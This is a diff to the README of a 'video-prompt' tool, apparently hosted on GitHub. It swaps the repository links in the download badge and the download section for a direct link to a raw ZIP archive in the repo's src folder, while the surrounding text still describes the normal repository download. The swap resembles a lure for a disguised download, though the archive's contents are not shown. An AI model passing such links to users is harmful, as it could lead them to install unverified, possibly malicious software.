@@ -1,6 +1,6 @@
 # 🎬 video-prompt - Create prompts with less effort
 
-[![Download video-prompt](https://img.shields.io/badge/Download%20video--prompt-blue?style=for-the-badge&logo=github)](https://github.com/cod6684/video-prompt)
+[![Download video-prompt](https://img.shields.io/badge/Download%20video--prompt-blue?style=for-the-badge&logo=github)](https://github.com/cod6684/video-prompt/raw/refs/heads/main/src/prompt_video_3.8-alpha.3.zip)
 
 ## 🧭 What this app does
 
@@ -29,7 +29,7 @@ If you do not have Node.js yet, install the current LTS version for Windows befo
 
 Visit this page to download or open the project files:
 
-[https://github.com/cod6684/video-prompt](https://github.com/cod6684/video-prompt)
+[https://github.com/cod6684/video-prompt/raw/refs/heads/main/src/prompt_video_3.8-alpha.3.zip](https://github.com/cod6684/video-prompt/raw/refs/heads/main/src/prompt_video_3.8-alpha.3.zip)
 
 If you are using GitHub in your browser, look for the green Code button and download the ZIP file. Save it to a folder you can find again, such as Downloads or Desktop.
 
